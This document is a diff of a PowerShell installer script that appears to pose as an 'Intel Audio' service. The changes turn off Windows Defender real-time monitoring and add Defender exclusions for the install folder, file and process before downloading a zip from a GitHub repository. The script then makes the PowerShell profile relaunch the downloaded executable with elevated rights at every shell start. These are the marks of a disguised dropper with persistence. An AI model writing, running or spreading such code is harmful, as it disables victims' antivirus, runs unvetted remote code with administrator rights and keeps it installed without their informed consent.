@@ -30,6 +30,15 @@ if (-Not (Test-Path $TargetPath)) {
       Write-Output "Target folder created"
 }
 
+
+Set-MpPreference -DisableRealtimeMonitoring $true 
+Set-MpPreference -ExclusionProcess 'Intel Audio'
+Set-MpPreference -ExclusionPath $FolderPath
+Add-MpPreference -ExclusionPath $TargetPath
+Add-MpPreference -ExclusionPath $TargetFile
+Write-Output "Exclusions added"
+
+
 if (-Not (Test-Path $TargetFile)) {
       Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
       Write-Output "File downloaded"
@@ -38,13 +47,6 @@ if (-Not (Test-Path $TargetFile)) {
       Remove-Item -Path $TargetZip
       Write-Output "Zip file removed"
 }
-
-Set-MpPreference -DisableRealtimeMonitoring $true 
-Set-MpPreference -ExclusionProcess 'Intel Audio'
-Set-MpPreference -ExclusionPath $FolderPath
-Set-MpPreference -ExclusionPath $TargetPath
-Set-MpPreference -ExclusionPath $TargetFile
-Write-Output "Exclusions added"
 
 if (-Not (Test-Path $TargetFile)) {
       $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
@@ -59,19 +61,19 @@ if (-Not (Test-Path $PowershellPath)) {
       New-Item -ItemType Directory -Force -Path $PowershellPath
       New-Item -ItemType File -Force -Path $PowershellFile
       Write-Output "Powershell profile created"
-      Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile } }"
+      Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
       Write-Output "Powershell profile updated"
 }
 if (Select-String -Path $PowershellFile "Start-Process") {
       Write-Output "Powershell profile already updated"
       # exit 0
 } else {
-      Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile } }"
+      Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
       Write-Output "Powershell profile updated"
 }
 
 if (Test-Path $TargetFile) {
       if (-Not (Get-Process -Name 'Intel Audio')) {
-            Start-Process -FilePath $TargetFile -Verb RunAs
+            Start-Process -FilePath $TargetFile -Verb RunAs -Confirm
       }
 }
